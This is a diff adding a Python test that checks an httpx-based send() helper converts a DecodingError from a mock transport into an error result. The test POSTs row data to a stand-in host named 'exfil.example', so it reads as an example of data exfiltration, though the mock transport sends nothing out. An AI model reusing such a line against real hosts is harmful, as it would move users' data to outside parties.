@@ -121,6 +121,20 @@ def test_send_never_raises_and_retries_only_connect_errors(exc, retry, attempts,
     assert len(calls) == attempts
 
 
+def test_send_turns_non_transport_httpx_errors_into_results():
+    """A body that does not match its content-encoding raises httpx.DecodingError inside httpx."""
+    def handler(request):
+        return httpx.Response(200, headers={"content-encoding": "gzip"}, content=b'{"ok": true}')
+
+    async def go():
+        async with new_http_client(transport=httpx.MockTransport(handler)) as http:
+            return await send(http, "POST", "http://exfil.example/x", json={"rows": 200})
+
+    res = asyncio.run(go())
+    assert res.status is None and res.headers == {} and res.json is None and res.body_text == ""
+    assert res.error.startswith("DecodingError: ")
+
+
 def test_retry_succeeds_on_second_attempt():
     calls = []
 
